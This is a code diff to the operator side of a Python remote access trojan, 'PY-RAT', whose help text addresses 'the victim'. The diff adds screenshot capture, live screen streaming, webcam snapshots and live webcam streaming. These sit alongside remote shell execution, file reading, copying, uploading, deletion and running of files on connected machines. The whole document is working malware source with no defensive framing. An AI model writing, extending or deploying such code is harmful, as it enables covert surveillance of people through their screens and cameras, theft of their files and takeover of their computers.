@@ -1,7 +1,10 @@
+import numpy as np
+import cv2
 import socket
 import os
 from uuid import uuid4
 import threading
+import sys
 
 os.system('')
 
@@ -67,33 +70,29 @@ HELP_MSG = \
 ║ exit                   ║ Closes the connection with the victim and allows you to connect to a new victim.                                ║
 ╚════════════════════════╩═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 """
+
 CONNECTIONS = {}
+
+KEEP_STREAM = True
 
 def recvall(connection):
 
-    data = ''
-    
-    data += connection.recv(4096).decode()
+    sizeOfMsg = int(connection.recv(64).decode())
 
-    dataSplit, data = data.split('|', 1)
+    msg = b''
 
-    if dataSplit in data:
-            data = data.replace('|' + dataSplit, '')
-            return data
+    while len(msg) != sizeOfMsg:
+        msg += connection.recv(sizeOfMsg - len(msg))
 
-    while True:
+    return msg.decode()
 
-        data += connection.recv(4096).decode()
+def getSendableMsg(msg):
 
-        if dataSplit in data:
-            data = data.replace('|' + dataSplit, '')
-            return data
+    sizeOfMsg = str(len(msg))
 
-def getMsgWithDataSplit(msg):
+    sizeOfMsg = '0'*(64-len(sizeOfMsg)) + sizeOfMsg
 
-    dataSplit = str(uuid4())
-
-    return (dataSplit + '|' + msg + '|' + dataSplit).encode()
+    return (sizeOfMsg + str(msg)).encode()
 
 def makeConnections():
 
@@ -123,11 +122,19 @@ def testConnection(ADDR, PORT):
     except:
         return False
 
+def stopStream(connection):
+    global KEEP_STREAM
+    input('Press enter to stop the stream...')
+    KEEP_STREAM = False
+    connection.send(getSendableMsg('STOP STREAM'))
+
 def clearTerminal():
     try:
         os.system('cls')
     except:
         os.system('clear')
+
+clearTerminal()
 
 while True:
     autoDetectAddr = input(f'DO YOU WANT TO USE PY-RAT\'S AUTO DETECTED IP ADDRESS ({socket.gethostbyname(socket.gethostname())}) (Y/N) : ').strip()
@@ -187,7 +194,7 @@ while True:
         deadConns = []
         for address in CONNECTIONS:
             try:
-                CONNECTIONS[address].sendall(getMsgWithDataSplit('Refresh'))
+                CONNECTIONS[address].send(getSendableMsg('Refresh'))
                 recvall(CONNECTIONS[address])
             except:
                 deadConns.append(address)
@@ -203,7 +210,7 @@ while True:
 
             try:
 
-                CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('EstablishConnection'))
+                CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('EstablishConnection'))
 
             except:
 
@@ -228,7 +235,7 @@ while True:
                         print(HELP_MSG)
 
                     elif command == 'ls':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('ls'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('ls'))
                         data = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if data == 'ERROR':
                             print('INVALID PERMISSIONS OR DIRECTORY!')
@@ -237,9 +244,9 @@ while True:
                             print(''.join([f'{directory}\n' for directory in eval(data)]))
 
                     elif command == 'cd':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('cd'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('cd'))
                         folder = input('Enter the folder >>> ')
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(folder)))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(str(folder)))
                         data = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if data == 'ERROR':
                             print('INVALID PERMISSIONS OR DIRECTORY!')
@@ -247,9 +254,9 @@ while True:
                             CURRENT_CONNECTION_DIRECTORY = data
 
                     elif command == 'goto':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('goto'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('goto'))
                         directory = input('Enter the directory >>> ')
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(directory)))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(str(directory)))
                         data = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if data == 'ERROR':
                             print('INVALID PERMISSIONS OR DIRECTORY!')
@@ -257,9 +264,9 @@ while True:
                             CURRENT_CONNECTION_DIRECTORY = data
 
                     elif command == 'size':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('size'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('size'))
                         file = input('Enter the file >>> ')
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(str(file)))
                         data = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if data == 'ERROR':
                             print('INVALID PERMISSIONS OR DIRECTORY!')
@@ -267,9 +274,9 @@ while True:
                             print(f'The size of {file} is {data} bytes')
 
                     elif command == 'read':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('read'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('read'))
                         file = input('Enter the file >>> ')
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(str(file)))
                         data = recvall(CONNECTIONS[CONNECTION_ADDR])
                         print(f'Contents of {file} :\n')
                         if data == 'ERROR':
@@ -281,14 +288,14 @@ while True:
                                 print(f'\n\nCRTL+C PRESSED!\n\n')
 
                     elif command == 'write':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('write'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('write'))
                         fileName = input('Enter the file >>> ')
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(fileName))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(fileName))
                         try:
                             with open(fileName, 'r') as f:
                                 file = f.read()
 
-                            CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(file))
+                            CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(file))
 
                             fileSavePath = recvall(CONNECTIONS[CONNECTION_ADDR])
 
@@ -301,7 +308,7 @@ while True:
                                 with open(fileName, 'rb') as f:
                                     file = f.read()
 
-                                CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
+                                CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(str(file)))
 
                                 fileSavePath = recvall(CONNECTIONS[CONNECTION_ADDR])
 
@@ -310,13 +317,13 @@ while True:
                                 else:
                                     print(f'File successfully written and saved to {fileSavePath}')
                             except:
-                                CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('ERROR'))
+                                CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('ERROR'))
                                 print(f'File {fileName} not found or is unreadable!')                        
 
                     elif command == 'copy':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('copy'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('copy'))
                         file = input('Enter the file >>> ')
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(str(file)))
                         data = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if data == 'ERROR':
                             print(f'FAILED TO COPY {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
@@ -335,9 +342,9 @@ while True:
                             print(f'File copied and saved successfully to {os.path.join(os.getcwd(), file)}!')
 
                     elif command == 'run':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('run'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('run'))
                         file = input('Enter the file >>> ')
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(str(file)))
                         data = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if data == 'ERROR':
                             print(f'FAILED TO RUN {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
@@ -345,9 +352,9 @@ while True:
                             print('File ran successfully')
 
                     elif command == 'rm':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('rm'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('rm'))
                         file = input('Enter the file >>> ')
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(str(file)))
                         data = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if data == 'ERROR':
                             print(f'FAILED TO REMOVE {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
@@ -355,9 +362,9 @@ while True:
                             print('File deleted successfully')
 
                     elif command == 'mkdir':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('mkdir'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('mkdir'))
                         folder = input('Enter the folder >>> ')
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(folder)))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(str(folder)))
                         data = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if data == 'ERROR':
                             print(f'FAILED TO CREATE {folder}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
@@ -365,9 +372,9 @@ while True:
                             print(f'Folder {folder} created successfully')
                     
                     elif command == 'rmdir':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('rmdir'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('rmdir'))
                         folder = input('Enter the folder >>> ')
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(folder)))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(str(folder)))
                         data = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if data == 'ERROR':
                             print(f'FAILED TO REMOVE {folder}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
@@ -375,9 +382,9 @@ while True:
                             print(f'Folder {folder} removed successfully')
 
                     elif command == 'exec':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('exec'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('exec'))
                         executeCommand = input('Enter the command >>> ')
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(executeCommand))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg(executeCommand))
                         commandResult = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if command == 'ERROR':
                             print('FAILED TO EXECUTE COMMAND PROPERLY!')
@@ -385,7 +392,7 @@ while True:
                             print(commandResult)
 
                     elif command == 'pyinstall':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('pyinstall'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('pyinstall'))
                         result = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if result == 'ERROR':
                             print('FAILED TO INSTALL PYTHON ON CLIENT!')
@@ -393,7 +400,7 @@ while True:
                             print('PYTHON SUCCESSFULLY INSTALLED ON CLIENT')
 
                     elif command == 'sysinfo':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('sysinfo'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('sysinfo'))
                         sysInfo = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if sysInfo == 'ERROR':
                             print('UNABLE TO OBTAIN SYSTEM INFORMATION!')
@@ -401,7 +408,7 @@ while True:
                             print(sysInfo)
 
                     elif command == 'drives':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('drives'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('drives'))
                         drives = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if drives == 'ERROR':
                             print('UNABLE TO OBTAIN DRIVES INFORMATION!')
@@ -409,18 +416,147 @@ while True:
                             print(drives)
 
                     elif command == 'system':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('system'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('system'))
                         system = recvall(CONNECTIONS[CONNECTION_ADDR])
                         if system == 'ERROR':
                             print('UNABLE TO OBTAIN SYSTEM INFORMATION!')
                         else:
                             print(system)
 
+                    elif command == 'screenshot':
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('screenshot'))
+                        imageSize = recvall(CONNECTIONS[CONNECTION_ADDR])
+                        if imageSize == 'ERROR':
+                            print('FAILED TO CAPTURE SCREEN!')
+                        else:
+                            imageSize = eval(imageSize)
+
+                            imageBuffer = int(recvall(CONNECTIONS[CONNECTION_ADDR]))
+
+                            imageBytes = b''
+
+                            while sys.getsizeof(imageBytes) != imageBuffer:
+                                imageBytes += CONNECTIONS[CONNECTION_ADDR].recv(imageBuffer - sys.getsizeof(imageBytes))
+
+                            imageArray = np.frombuffer(imageBytes, np.uint8)
+
+                            imageArray = imageArray.reshape(imageSize[1], imageSize[0], 3)
+
+                            imageArray = cv2.cvtColor(imageArray, cv2.COLOR_BGR2RGB)
+
+                            cv2.imwrite(f'{CONNECTION_ADDR}-SCREENSHOT-{uuid4()}.png', imageArray)
+
+                            print(f'SCREENSHOT SAVED!')
+
+                    elif command == 'screenshare':
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('screenshare'))
+
+                        stopStreamThread = threading.Thread(target = stopStream, args = (CONNECTIONS[CONNECTION_ADDR], ), daemon = True)
+                        stopStreamThread.start()
+                        
+                        while KEEP_STREAM:
+                            imageSize = recvall(CONNECTIONS[CONNECTION_ADDR])
+                            if imageSize == 'ERROR':
+                                print('FAILED TO SHARE SCREEN!')
+                                break
+                            else:
+                                imageSize = eval(imageSize)
+
+                                imageBuffer = int(recvall(CONNECTIONS[CONNECTION_ADDR]))
+
+                                imageBytes = b''
+
+                                while sys.getsizeof(imageBytes) != imageBuffer:
+                                    imageBytes += CONNECTIONS[CONNECTION_ADDR].recv(imageBuffer - sys.getsizeof(imageBytes))
+
+                                imageArray = np.frombuffer(imageBytes, np.uint8)
+
+                                imageArray = imageArray.reshape(imageSize[1], imageSize[0], 3)
+
+                                imageArray = cv2.cvtColor(imageArray, cv2.COLOR_BGR2RGB)
+
+                                cv2.namedWindow(f'{CONNECTION_ADDR}\'s CAMERA', cv2.WINDOW_NORMAL)
+
+                                cv2.resizeWindow(f'{CONNECTION_ADDR}\'s CAMERA', 852, 480)
+
+                                cv2.imshow(f'{CONNECTION_ADDR}\'s CAMERA', imageArray)
+
+                                cv2.waitKey(1)
+
+                                CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('FRAME DISPLAYED'))
+
+                        KEEP_STREAM = True
+
+                        cv2.destroyAllWindows()
+
+                    elif command == 'camshot':
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('camshot'))
+                        imageSize = recvall(CONNECTIONS[CONNECTION_ADDR])
+                        if imageSize == 'ERROR':
+                            print('FAILED TO CAPTURE CAMERA!')
+                        else:
+                            imageSize = eval(imageSize)
+
+                            imageBuffer = int(recvall(CONNECTIONS[CONNECTION_ADDR]))
+
+                            imageBytes = b''
+
+                            while sys.getsizeof(imageBytes) != imageBuffer:
+                                imageBytes += CONNECTIONS[CONNECTION_ADDR].recv(imageBuffer - sys.getsizeof(imageBytes))
+
+                            imageArray = np.frombuffer(imageBytes, np.uint8)
+
+                            imageArray = imageArray.reshape(imageSize[1], imageSize[0], 3)
+
+                            cv2.imwrite(f'{CONNECTION_ADDR}-CAMERA-PICTURE-{uuid4()}.png', imageArray)
+
+                            print(f'PICTURE SAVED!')
+
+                    elif command == 'camshare':
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('camshare'))
+
+                        stopStreamThread = threading.Thread(target = stopStream, args = (CONNECTIONS[CONNECTION_ADDR], ), daemon = True)
+                        stopStreamThread.start()
+                        
+                        while KEEP_STREAM:
+                            imageSize = recvall(CONNECTIONS[CONNECTION_ADDR])
+                            if imageSize == 'ERROR':
+                                print('FAILED TO SHARE CAMERA!')
+                                break
+                            else:
+                                imageSize = eval(imageSize)
+
+                                imageBuffer = int(recvall(CONNECTIONS[CONNECTION_ADDR]))
+
+                                imageBytes = b''
+
+                                while sys.getsizeof(imageBytes) != imageBuffer:
+                                    imageBytes += CONNECTIONS[CONNECTION_ADDR].recv(imageBuffer - sys.getsizeof(imageBytes))
+
+                                imageArray = np.frombuffer(imageBytes, np.uint8)
+
+                                imageArray = imageArray.reshape(imageSize[1], imageSize[0], 3)
+
+                                cv2.namedWindow(f'{CONNECTION_ADDR}\'s CAMERA', cv2.WINDOW_NORMAL)
+
+                                cv2.resizeWindow(f'{CONNECTION_ADDR}\'s CAMERA', 852, 480)
+
+                                cv2.imshow(f'{CONNECTION_ADDR}\'s CAMERA', imageArray)
+
+                                cv2.waitKey(1)
+
+                                CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('FRAME DISPLAYED'))
+
+                        KEEP_STREAM = True
+
+                        cv2.destroyAllWindows()
+
+
                     elif command == 'cls':
                         clearTerminal()
 
                     elif command == 'exit':
-                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('CloseConnection'))
+                        CONNECTIONS[CONNECTION_ADDR].send(getSendableMsg('CloseConnection'))
                         CONNECTION_ADDR = ''
                         CURRENT_CONNECTION_DIRECTORY = ''
                         break
